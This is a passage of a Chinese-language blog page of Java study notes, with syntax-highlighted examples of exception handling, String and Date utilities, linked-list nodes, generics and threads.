class="hljs-string">&quot;出现异常&quot;</span>);<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>直接用Exception，捕获所有类型的异常</p><p><img src="/2023/04/24/java-note/image-20230917022005936.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Main;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-comment">//可能发生异常的代码</span><br>                        System.out.println(<span class="hljs-number">10</span>/<span class="hljs-number">0</span>);<br>                &#125;<br>                <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                        <span class="hljs-comment">/*</span><br><span class="hljs-comment">                        *当异常发生时</span><br><span class="hljs-comment">                        * 将异常封装成Exception对象e，传递给catch</span><br><span class="hljs-comment">                        *执行catch内的代码</span><br><span class="hljs-comment">                        * 如果没有发生异常，catch内代码不执行</span><br><span class="hljs-comment">                        */</span><br>                        e.printStackTrace();<br>                        System.out.println(<span class="hljs-string">&quot;出现异常&quot;</span>);<br>                &#125;<br>                <span class="hljs-keyword">finally</span> &#123;<br>                        <span class="hljs-comment">//无论有没有发生异常都执行</span><br>                    <span class="hljs-comment">//释放资源等代码常常放在finally中</span><br>                        System.out.println(<span class="hljs-string">&quot;无论如何都执行&quot;</span>);<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Main;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-comment">//可能发生异常的代码</span><br>                        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>; i &gt;= -<span class="hljs-number">5</span>;i -- )<br>                                System.out.println(<span class="hljs-string">&quot;10/&quot;</span>+i+<span class="hljs-string">&quot;=&quot;</span>+<span class="hljs-number">10</span>/i);<br>                        <span class="hljs-comment">//异常发生后执行catch代码，try剩下代码不执行</span><br>                &#125;<br>                <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                        <span class="hljs-comment">/*</span><br><span class="hljs-comment">                        *当异常发生时</span><br><span class="hljs-comment">                        * 将异常封装成Exception对象e，传递给catch</span><br><span class="hljs-comment">                        *执行catch内的代码</span><br><span class="hljs-comment">                        * 如果没有发生异常，catch内代码不执行</span><br><span class="hljs-comment">                        */</span><br>                        e.printStackTrace();<br>                        System.out.println(<span class="hljs-string">&quot;出现异常&quot;</span>);<br>                &#125;<br>                <span class="hljs-keyword">finally</span> &#123;<br>                        <span class="hljs-comment">//无论有没有发生异常都执行</span><br>                        System.out.println(<span class="hljs-string">&quot;无论如何都执行&quot;</span>);<br>                &#125;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>常用类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WrapperMethod</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>                System.out.println(Integer.MIN_VALUE); <span class="hljs-comment">//返回最小值</span><br>                System.out.println(Integer.MAX_VALUE);<span class="hljs-comment">//返回最大值</span><br>                System.out.println(Character.isDigit(<span class="hljs-string">&#x27;a&#x27;</span>));<span class="hljs-comment">//判断是不是数字</span><br>                System.out.println(Character.isLetter(<span class="hljs-string">&#x27;a&#x27;</span>));<span class="hljs-comment">//判断是不是字母</span><br>                System.out.println(Character.isUpperCase(<span class="hljs-string">&#x27;a&#x27;</span>));<span class="hljs-comment">//判断是不是大写</span><br>                System.out.println(Character.isLowerCase(<span class="hljs-string">&#x27;a&#x27;</span>));<span class="hljs-comment">//判断是不是小写</span><br>                System.out.println(Character.isWhitespace(<span class="hljs-string">&#x27;a&#x27;</span>));<span class="hljs-comment">//判断是不是空格</span><br>                System.out.println(Character.toUpperCase(<span class="hljs-string">&#x27;a&#x27;</span>));<span class="hljs-comment">//转成大写</span><br>                System.out.println(Character.toLowerCase(<span class="hljs-string">&#x27;A&#x27;</span>));<span class="hljs-comment">//转成小写</span><br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>string类常用方法：</p><p><img src="/2023/04/24/java-note/image-20230917231837706.png"></p><p><img src="/2023/04/24/java-note/image-20230918000324954.png"></p><p>占位符：%s 字符串 %c 字符 %d 整型 %.2f 浮点型</p><p>String类中的foemat方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Main;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String[] args)</span> &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;name:%s,age:%d,gender:%c,height:%f&quot;</span>;<br>                        str = String.format(str,<span class="hljs-string">&quot;potato&quot;</span>,<span class="hljs-number">19</span>,<span class="hljs-string">&#x27;m&#x27;</span>,<span class="hljs-number">186.0</span>);<br>                        System.out.println(str);<br>                &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                        System.out.println(<span class="hljs-string">&quot;233&quot;</span>);<br>                &#125;<br><br>        &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/24/java-note/image-20230918105410426.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">StringBuffer</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>(<span class="hljs-string">&quot;hello&quot;</span>);<br>buffer.append(<span class="hljs-string">&quot; world&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">finalString</span> <span class="hljs-operator">=</span> buffer.toString();<br></code></pre></td></tr></table></figure><p><code>valueOf()</code>方法：</p><p>将一个特定类型的值转换成其他类型的值。例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">String.valueOf(<span class="hljs-number">114514</span>);<span class="hljs-comment">//代表将整数42转化成字符串42</span><br></code></pre></td></tr></table></figure><p>Array类：</p><p><img src="/2023/04/24/java-note/image-20230918110116884.png"></p><p><img src="/2023/04/24/java-note/image-20230918110132068.png"></p><p>Date类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Main;<br><br><span class="hljs-keyword">import</span> java.text.SimpleDateFormat;<br><span class="hljs-keyword">import</span> java.util.Date;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String[] args)</span> &#123;<br>                <span class="hljs-type">Date</span> <span class="hljs-variable">d1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();<br>                System.out.println(d1);<br>                <span class="hljs-type">SimpleDateFormat</span> <span class="hljs-variable">sdf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">&quot;yyyy 年 MM 月 dd 日 hh:mm:ss E&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">format</span> <span class="hljs-operator">=</span> sdf.format(d1); <span class="hljs-comment">// format:将日期转换成指定格式的字符串</span><br>                System.out.println(<span class="hljs-string">&quot;当前日期=&quot;</span> + format);<br>        &#125;<br><br>&#125;<br><span class="hljs-comment">//Mon Sep 18 11:14:47 CST 2023</span><br><span class="hljs-comment">//当前日期=2023 年 09 月 18 日 11:14:47 周一</span><br></code></pre></td></tr></table></figure><p>时间戳：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Main;<br><br><span class="hljs-keyword">import</span> java.text.SimpleDateFormat;<br><span class="hljs-keyword">import</span> java.time.Instant;<br><span class="hljs-keyword">import</span> java.util.Date;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String[] args)</span> &#123;<br>                <span class="hljs-type">Instant</span> <span class="hljs-variable">now</span> <span class="hljs-operator">=</span> Instant.now();<span class="hljs-comment">//通过now()方法获取当前时间戳对象</span><br>                System.out.println(now);<br>                <span class="hljs-type">Date</span> <span class="hljs-variable">date</span> <span class="hljs-operator">=</span> Date.from(now);<span class="hljs-comment">//通过Date可以把instant转为date</span><br>                System.out.println(date);<br>                <span class="hljs-type">SimpleDateFormat</span> <span class="hljs-variable">sdf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">&quot;yyyy年MM月dd日  hh:mm:ss&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> sdf.format(date);<br>                System.out.println(d);<br>                <span class="hljs-type">Instant</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> date.toInstant();<span class="hljs-comment">//通过Date类的toInstant()方法将Date对象转为时间戳</span><br>                System.out.println(t);<br>        &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>Node节点：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Node</span> &#123;<br>        <span class="hljs-keyword">public</span> Object item; <span class="hljs-comment">//真正存放数据</span><br>        <span class="hljs-keyword">public</span> Node next; <span class="hljs-comment">//指向后一个结点</span><br>        <span class="hljs-keyword">public</span> Node pre; <span class="hljs-comment">//指向前一个结点</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Node</span><span class="hljs-params">(Object name)</span> &#123;<br>                <span class="hljs-built_in">this</span>.item = name;<br>        &#125;<br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Node name=&quot;</span> + item;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Node</span> <span class="hljs-variable">jack</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;jack&quot;</span>);<br>        <span class="hljs-type">Node</span> <span class="hljs-variable">tom</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;tom&quot;</span>);<br>        <span class="hljs-type">Node</span> <span class="hljs-variable">hsp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Node</span>(<span class="hljs-string">&quot;老韩&quot;</span>);<br><span class="hljs-comment">//连接三个结点，形成双向链表</span><br><span class="hljs-comment">//jack -&gt; tom -&gt; hsp</span><br>        jack.next = tom;<br>        tom.next = hsp;<br><span class="hljs-comment">//hsp -&gt; tom -&gt; jack</span><br>        hsp.pre = tom;<br>        tom.pre = jack;<br>        <span class="hljs-type">Node</span> <span class="hljs-variable">first</span> <span class="hljs-operator">=</span> jack;<span class="hljs-comment">//让 first 引用指向 jack,就是双向链表的头结点</span><br>        <span class="hljs-type">Node</span> <span class="hljs-variable">last</span> <span class="hljs-operator">=</span> hsp; <span class="hljs-comment">//让 last 引用指向 hsp,就是双向链表的尾结点</span><br></code></pre></td></tr></table></figure><p>输出链表：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) &#123;<br>        <span class="hljs-keyword">if</span>(first == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">break</span>;<br>        &#125;<br><span class="hljs-comment">//输出 first 信息</span><br>        System.out.println(first);<br>        first = first.next;<br>        &#125;<br></code></pre></td></tr></table></figure><p>ArrayList类链表以及类似于foreach的强循环</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ArrayList</span> <span class="hljs-variable">arrayList</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>();<br>arrayList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;旺财&quot;</span>, <span class="hljs-number">10</span>));<br>arrayList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;发财&quot;</span>, <span class="hljs-number">1</span>));<br>arrayList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;小黄&quot;</span>, <span class="hljs-number">5</span>));<br><span class="hljs-comment">//假如我们的程序员，不小心，添加了一只猫</span><br>arrayList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Cat</span>(<span class="hljs-string">&quot;招财猫&quot;</span>, <span class="hljs-number">8</span>));<br><span class="hljs-comment">//遍历</span><br><span class="hljs-keyword">for</span> (Object o : arrayList) &#123;<br><span class="hljs-comment">//向下转型 Object -&gt;Dog</span><br><span class="hljs-type">Dog</span> <span class="hljs-variable">dog</span> <span class="hljs-operator">=</span> (Dog) o;<br>System.out.println(dog.getName() + <span class="hljs-string">&quot;-&quot;</span> + dog.getAge());<br>&#125;<br></code></pre></td></tr></table></figure><p>如果用泛型，则不需要转型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>                ArrayList&lt;Dog&gt; dogs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Dog&gt;();<br>                dogs.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;lff&quot;</span>,<span class="hljs-number">19</span>));<br>                dogs.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;wmt&quot;</span>,<span class="hljs-number">19</span>));<br>                <span class="hljs-keyword">for</span> (Dog dog : dogs)&#123;<br>                        dog.eat();<br>                &#125;<br>        &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span>&#123;<br>        <span class="hljs-keyword">public</span> String name;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Dog</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>                <span class="hljs-built_in">this</span>.name = name;<br>                <span class="hljs-built_in">this</span>.age = age;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>&#123;<br>                System.out.println(<span class="hljs-built_in">this</span>.name+<span class="hljs-string">&quot; is eating&quot;</span>);<br>        &#125;<br>&#125;<br><span class="hljs-comment">//泛型的作用是：可以在类声明时通过一个标识表示类中某个属性的类型，</span><br><span class="hljs-comment">//或者是某个方法的返回值的类型，或者是参数类型</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/24/java-note/image-20230926153626238.png"></p><p>泛型的声明：</p><p><img src="/2023/04/24/java-note/image-20230926175236490.png"></p><p>泛型的实例化：</p><p><img src="/2023/04/24/java-note/image-20230926175651544.png"></p><p>线程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>                <span class="hljs-type">Dog</span> <span class="hljs-variable">dog</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;lff&quot;</span>,<span class="hljs-number">19</span>);<br>                dog.start();<span class="hljs-comment">//启动线程，要重写run()方法</span><br>        &#125;<br>&#125;<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Thread</span>&#123;<br>        <span class="hljs-keyword">public</span> String name;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>&#123;<br>                <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>                        System.out.println(<span class="hljs-string">&quot;dog is running&quot;</span>);<br>                        <span class="hljs-keyword">try</span> &#123;<br>                                Thread.sleep(<span class="hljs-number">2000</span>);<span class="hljs-comment">//每隔2秒输出小狗在吃</span><br>                        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                                e.printStackTrace();<br>                        &#125;<br>                &#125;<br><br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Dog</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>                <span class="hljs-built_in">this</span>.name = name;<br>                <span class="hljs-built_in">this</span>.age = age;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>&#123;<br>                System.out.println(<span class="hljs-built_in">this</span>.name+<span class="hljs-string">&quot; is eating&quot;</span>);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/24/java-note/image-20230929022335921.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>                <span class="hljs-comment">//dog.start();//启动线程，要重写run()方法</span><br>                <span class="hljs-type">Thread</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;lff&quot;</span>,<span class="hljs-number">19</span>));<span class="hljs-comment">//此处的差别</span><br>                d.start();<br>        &#125;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span>&#123;<br><br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Animal</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span>&#123;<br>        <span class="hljs-keyword">public</span> String name;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>&#123;<br>                <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>                        System.out.println(<span class="hljs-string">&quot;dog is running&quot;</span>);<br>                        <span class="hljs-keyword">try</span> &#123;<br>                                Thread.sleep(<span class="hljs-number">2000</span>);<br>                        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>                                e.printStackTrace();<br>                        &#125;<br>                &#125;<br><br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Dog</span><span class="hljs-params">(String name,<span class="hljs-type">int</span> age)</span>&#123;<br>                <span class="hljs-built_in">this</span>.name = name;<br>                <span class="hljs-built_in">this</span>.age = age;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>&#123;<br>                System.out.println(<span class="hljs-built_in">this</span>.name+<span class="hljs-string">&quot; is eating&quot;</span>);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>线程常用方法：</p><p><img src="/2023/04/24/java-note/image-20230929031952648.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>                <span class="hljs-comment">//dog.start();//启动线程，要重写run()方法</span><br>                <span class="hljs-type">Thread</span> <span class="hljs-variable">d</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;lff&quot;</span>,<span class="hljs-number">19</span>));<br>                <span class="hljs-type">Thread</span> <span class="hljs-variable">d1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">&quot;zyh&quot;</span>,<span class="hljs-number">19</span>));<br>                <span class="hljs-type">Thread</span> <span 